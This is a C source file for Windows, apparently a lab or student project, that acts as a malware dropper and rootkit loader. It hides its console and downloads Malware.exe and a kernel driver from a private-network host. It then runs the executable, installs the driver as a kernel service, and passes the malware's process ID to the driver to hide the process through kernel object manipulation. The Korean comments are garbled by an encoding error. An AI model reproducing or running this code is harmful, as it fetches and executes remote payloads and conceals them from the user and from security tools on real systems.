#include <stdio.h>
#include <Windows.h>
#include <Winbase.h>
#include <Tlhelp32.h>
#include <strsafe.h>
#include <stdlib.h>
#include <winsock.h>
#include <wininet.h>
#include <atlstr.h>
#pragma comment(lib,"Wininet.lib")
#define READ_BUF_SIZE    1024


bool _util_load_sysfile()
{
	LPCTSTR theDriverName = TEXT("DKOM_Driver");
	LPCTSTR aPath = TEXT("C:\\Users\\eternalklaus\\AppData\\Local\\Temp\\DKOM_Driver.sys");
	SC_HANDLE sh = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (!sh)
	{
		return false;
	}

	printf("loading %s\n", aPath);
	SC_HANDLE rh = CreateService(sh, theDriverName, theDriverName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, aPath, NULL, NULL, NULL, NULL, NULL);

	if (!rh)
	{
		if (GetLastError() == ERROR_SERVICE_EXISTS)
		{
			rh = OpenService(sh, theDriverName, SERVICE_ALL_ACCESS);
			if (!rh)
			{
				printf("Cannot open service\n");
				CloseServiceHandle(sh);
				return false;
			}
		}
		else
		{
			printf("Cannot create service\n");
			CloseServiceHandle(sh);
			return false;
		}
	}

	if (rh)
	{
		if (0 == StartService(rh, 0, NULL))
		{
			DWORD imsi = GetLastError();
			if (imsi == ERROR_SERVICE_ALREADY_RUNNING)
			{
				printf("Service is already running\n");
			}
			else
			{
				printf("Cannot start service\n");
				CloseServiceHandle(sh);
				CloseServiceHandle(rh);
				return false;
			}
		}
		CloseServiceHandle(sh);
		CloseServiceHandle(rh);
	}
	printf("Service started successfully\n");
	return true;
}

int getFileFromHttp(char* pszUrl, char* pszFile)
{
	HINTERNET    hInet, hUrl;
	DWORD        dwReadSize = 0;

	// WinINet�Լ� �ʱ�ȭ
	if ((hInet = InternetOpen(TEXT("MyWeb"),            // user agent in the HTTP protocol
		INTERNET_OPEN_TYPE_DIRECT,    // AccessType
		NULL,                        // ProxyName
		NULL,                        // ProxyBypass
		0)) != NULL)                // Options
	{

		// �Էµ� HTTP�ּҸ� ����
		if ((hUrl = InternetOpenUrl(hInet,        // ���ͳ� ������ �ڵ�
			pszUrl,                        // URL
			NULL,                        // HTTP server�� ������ �ش�
			0,                            // �ش� ������
			0,                            // Flag
			0)) != NULL)                // Context
		{
			FILE    *fp;

			// �ٿ�ε��� ���� �����
			if ((fp = fopen(pszFile, "wb")) != NULL)
			{
				TCHAR    szBuff[READ_BUF_SIZE];
				DWORD    dwSize;
				DWORD    dwDebug = 10;

				do {
					// ������ ���� �б�
					InternetReadFile(hUrl, szBuff, READ_BUF_SIZE, &dwSize);

					// ������ ������ ������� ���Ͽ� ��ֱ�
					fwrite(szBuff, dwSize, 1, fp);

					dwReadSize += dwSize;
				} while ((dwSize != 0) || (--dwDebug != 0));

				fclose(fp);
			}
			// ���ͳ� �ڵ� �ݱ�
			InternetCloseHandle(hUrl);
		}
		// ���ͳ� �ڵ� �ݱ�
		InternetCloseHandle(hInet);
	}
	return(dwReadSize);
}


DWORD MyGetProcessId(LPCTSTR ProcessName) // non-conflicting function name
{
	PROCESSENTRY32 pt;
	HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pt.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hsnap, &pt)) { // must call this first
		do {
			if (!lstrcmpi(pt.szExeFile, ProcessName)) {
				CloseHandle(hsnap);
				return pt.th32ProcessID;
			}
		} while (Process32Next(hsnap, &pt));
	}
	CloseHandle(hsnap); // close handle on failure
	return 0;
}



int main()
{
	//�ܼ� ���߱�
	HWND hWndConsole = GetConsoleWindow();
	ShowWindow(hWndConsole, SW_HIDE);

	HANDLE hFile;
	DWORD ProcessId, write;

	//�Ǽ��ڵ� ���� �ٿ�ε�
	char *Malware = "C:\\Users\\eternalklaus\\AppData\\Local\\Temp\\Malware.exe";
	char *driver = "C:\\Users\\eternalklaus\\AppData\\Local\\Temp\\DKOM_Driver.sys";
	getFileFromHttp("http://192.168.140.133/Malware.exe", Malware);
	getFileFromHttp("http://192.168.140.133/DKOM_Driver.sys", driver);


	//Malware.exe ����
	ShellExecute(NULL, "open", "C:\\Users\\eternalklaus\\AppData\\Local\\Temp\\Malware.exe", NULL, NULL, SW_SHOW);


	//����̽� ����̹� ��ġ
	_util_load_sysfile();
	hFile = CreateFile("\\\\.\\DKOM_Driver", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	ProcessId = MyGetProcessId(TEXT("Malware.exe"));
	printf("Malware.exe : ProcessId is %d\n ", ProcessId);

	//����ó�� 01
	if (ProcessId == 0) {
		printf("cannot find processid!!\n");
		return -1;
	}
	//����ó�� 02
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Error:(%d)\nMake sure the driver is loaded.\n", GetLastError());
		return -1;
	}

	//chrome.exe ���μ��� ����
	if (!WriteFile(hFile, &ProcessId, sizeof(DWORD), &write, NULL))
	{
		printf("\nError: Unable to hide process (%d)\n", GetLastError());
	}
	else
	{
		printf("\nProcess successfully hidden.\n");
	}

	return 0;
}
